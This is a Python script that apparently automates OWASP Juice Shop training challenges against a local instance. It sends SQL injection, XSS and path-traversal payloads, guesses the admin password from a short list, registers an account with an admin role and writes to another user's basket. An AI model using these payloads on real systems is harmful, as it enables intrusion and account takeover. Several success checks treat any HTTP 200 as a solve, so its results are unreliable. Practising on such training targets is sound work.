#!/usr/bin/env python3
"""
OWASP Juice Shop Challenge Solver
Educational tool for learning web security concepts
"""

import requests
import json
import time
import re
from urllib.parse import urljoin
from typing import Dict, List, Optional

class JuiceShopSolver:
    def __init__(self, base_url: str = "http://localhost:3000"):
        """Initialize the Juice Shop solver with base URL"""
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.challenges = {}
        self.solved_challenges = []
        
    def check_connection(self) -> bool:
        """Check if Juice Shop is accessible"""
        try:
            response = self.session.get(self.base_url, timeout=10)
            return response.status_code == 200
        except requests.RequestException:
            return False
    
    def get_challenges(self) -> Dict:
        """Retrieve all available challenges"""
        try:
            url = urljoin(self.base_url, '/api/Challenges/')
            response = self.session.get(url)
            if response.status_code == 200:
                challenges_data = response.json()
                self.challenges = {c['name']: c for c in challenges_data['data']}
                return self.challenges
        except requests.RequestException as e:
            print(f"Error fetching challenges: {e}")
        return {}
    
    def register_user(self, email: str, password: str) -> bool:
        """Register a new user"""
        url = urljoin(self.base_url, '/api/Users/')
        data = {
            'email': email,
            'password': password,
            'passwordRepeat': password,
            'securityQuestion': {'id': 1, 'question': 'Your eldest siblings middle name?'},
            'securityAnswer': 'test'
        }
        try:
            response = self.session.post(url, json=data)
            return response.status_code == 201
        except requests.RequestException:
            return False
    
    def login(self, email: str, password: str) -> bool:
        """Login with credentials"""
        url = urljoin(self.base_url, '/rest/user/login')
        data = {'email': email, 'password': password}
        try:
            response = self.session.post(url, json=data)
            if response.status_code == 200:
                auth_data = response.json()
                token = auth_data.get('authentication', {}).get('token')
                if token:
                    self.session.headers.update({'Authorization': f'Bearer {token}'})
                    return True
        except requests.RequestException:
            pass
        return False
    
    def solve_dom_xss(self) -> bool:
        """Solve DOM XSS challenge"""
        try:
            # DOM XSS in search functionality
            url = urljoin(self.base_url, '/#/search?q=<iframe src="javascript:alert(`xss`)"></iframe>')
            response = self.session.get(url)
            return response.status_code == 200
        except requests.RequestException:
            return False
    
    def solve_sql_injection_login(self) -> bool:
        """Solve SQL injection login bypass"""
        url = urljoin(self.base_url, '/rest/user/login')
        # Classic SQL injection payload
        data = {
            'email': "admin@juice-sh.op'--",
            'password': 'anything'
        }
        try:
            response = self.session.post(url, json=data)
            return response.status_code == 200 and 'authentication' in response.text
        except requests.RequestException:
            return False
    
    def solve_weak_password(self) -> bool:
        """Solve weak password challenge by trying common passwords"""
        url = urljoin(self.base_url, '/rest/user/login')
        weak_passwords = ['123456', 'password', 'admin', '12345']
        
        for password in weak_passwords:
            data = {'email': 'admin@juice-sh.op', 'password': password}
            try:
                response = self.session.post(url, json=data)
                if response.status_code == 200 and 'authentication' in response.text:
                    return True
            except requests.RequestException:
                continue
        return False
    
    def solve_path_traversal(self) -> bool:
        """Solve path traversal challenge"""
        paths = [
            '/ftp/../../../etc/passwd',
            '/ftp/../../../windows/system32/drivers/etc/hosts',
            '/ftp/package.json.bak/../../../package.json'
        ]
        
        for path in paths:
            try:
                url = urljoin(self.base_url, path)
                response = self.session.get(url)
                if response.status_code == 200:
                    return True
            except requests.RequestException:
                continue
        return False
    
    def solve_xss_in_search(self) -> bool:
        """Solve XSS in search functionality"""
        payloads = [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(1)">',
            '"><script>alert(document.domain)</script>'
        ]
        
        for payload in payloads:
            try:
                url = urljoin(self.base_url, f'/rest/products/search?q={payload}')
                response = self.session.get(url)
                if response.status_code == 200:
                    return True
            except requests.RequestException:
                continue
        return False
    
    def solve_admin_registration(self) -> bool:
        """Solve admin registration challenge"""
        try:
            # Register as admin by manipulating the role
            url = urljoin(self.base_url, '/api/Users/')
            data = {
                'email': 'admin2@juice-sh.op',
                'password': 'admin123',
                'passwordRepeat': 'admin123',
                'role': 'admin',
                'securityQuestion': {'id': 1},
                'securityAnswer': 'test'
            }
            response = self.session.post(url, json=data)
            return response.status_code == 201
        except requests.RequestException:
            return False
    
    def solve_basket_manipulation(self) -> bool:
        """Solve basket manipulation challenge"""
        try:
            # First login as a user
            if not self.login('test@test.com', 'test123'):
                self.register_user('test@test.com', 'test123')
                self.login('test@test.com', 'test123')
            
            # Add item to basket
            url = urljoin(self.base_url, '/api/BasketItems/')
            data = {'ProductId': 1, 'BasketId': 1, 'quantity': 1}
            response = self.session.post(url, json=data)
            
            if response.status_code == 201:
                # Try to manipulate another user's basket
                data = {'ProductId': 1, 'BasketId': 2, 'quantity': 1}
                response = self.session.post(url, json=data)
                return response.status_code == 201
            
        except requests.RequestException:
            pass
        return False
    
    def get_solved_challenges(self) -> List[str]:
        """Get list of solved challenges"""
        try:
            url = urljoin(self.base_url, '/api/Challenges/')
            response = self.session.get(url)
            if response.status_code == 200:
                challenges = response.json()['data']
                solved = [c['name'] for c in challenges if c.get('solved')]
                self.solved_challenges = solved
                return solved
        except requests.RequestException:
            pass
        return []
    
    def run_all_solvers(self) -> Dict[str, bool]:
        """Run all challenge solvers"""
        results = {}
        
        print("Starting Juice Shop challenge solving...")
        
        if not self.check_connection():
            print(f"❌ Cannot connect to Juice Shop at {self.base_url}")
            return results
        
        print(f"✅ Connected to Juice Shop at {self.base_url}")
        
        # Get available challenges
        challenges = self.get_challenges()
        print(f"📋 Found {len(challenges)} challenges")
        
        # Define solvers
        solvers = {
            'DOM XSS': self.solve_dom_xss,
            'SQL Injection Login': self.solve_sql_injection_login,
            'Weak Password': self.solve_weak_password,
            'Path Traversal': self.solve_path_traversal,
            'XSS in Search': self.solve_xss_in_search,
            'Admin Registration': self.solve_admin_registration,
            'Basket Manipulation': self.solve_basket_manipulation
        }
        
        # Run each solver
        for name, solver in solvers.items():
            print(f"🔄 Attempting: {name}")
            try:
                success = solver()
                results[name] = success
                status = "✅ Solved" if success else "❌ Failed"
                print(f"   {status}: {name}")
                time.sleep(1)  # Rate limiting
            except Exception as e:
                print(f"   ❌ Error in {name}: {e}")
                results[name] = False
        
        # Check solved challenges
        solved = self.get_solved_challenges()
        print(f"\n🏆 Total challenges solved: {len(solved)}")
        
        return results

def main():
    """Main function to run the solver"""
    import argparse
    
    parser = argparse.ArgumentParser(description='OWASP Juice Shop Challenge Solver')
    parser.add_argument('--url', default='http://localhost:3000', 
                       help='Juice Shop URL (default: http://localhost:3000)')
    parser.add_argument('--challenge', help='Solve specific challenge')
    parser.add_argument('--list', action='store_true', 
                       help='List available challenges')
    
    args = parser.parse_args()
    
    solver = JuiceShopSolver(args.url)
    
    if args.list:
        challenges = solver.get_challenges()
        print("Available challenges:")
        for name, challenge in challenges.items():
            difficulty = challenge.get('difficulty', 'Unknown')
            print(f"  - {name} (Difficulty: {difficulty})")
        return
    
    if args.challenge:
        print(f"Solving specific challenge: {args.challenge}")
        # Add specific challenge solving logic here
        return
    
    # Run all solvers
    results = solver.run_all_solvers()
    
    # Print summary
    print("\n" + "="*50)
    print("SUMMARY")
    print("="*50)
    solved_count = sum(1 for success in results.values() if success)
    total_count = len(results)
    print(f"Solved: {solved_count}/{total_count} challenges")
    
    for challenge, success in results.items():
        status = "✅" if success else "❌"
        print(f"{status} {challenge}")

if __name__ == "__main__":
    main()